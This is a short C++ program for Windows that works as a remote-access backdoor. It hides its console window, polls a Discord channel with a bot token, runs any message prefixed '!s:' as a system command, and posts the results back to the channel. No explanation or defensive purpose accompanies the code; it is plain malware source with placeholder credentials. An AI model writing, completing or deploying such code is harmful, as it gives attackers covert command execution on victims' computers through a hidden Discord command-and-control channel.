#include <iostream>
#include "connection.h"
#include <Windows.h>
#include <filesystem>

std::string channel_id{"channel_id_here"};
std::string token{ "discord_token_here" };

int main() {

	ShowWindow(GetConsoleWindow(), SW_HIDE);

	auto tempDir = std::filesystem::temp_directory_path();

	std::filesystem::current_path(tempDir);

	while (true) {

		std::string command{ get_message(channel_id,token) };

		if (command._Starts_with("!s:") == true){
		    
			std::string command_result = executeCommand(command.substr(3));
			if (command_result.length() == 0)
			{
				send_message(channel_id,"Done !",token);

			}
			else
			{
				send_message(channel_id, command_result,token);
			}
		 

		}

		Sleep(1 ^ 3);
	}

	return 0;

}
    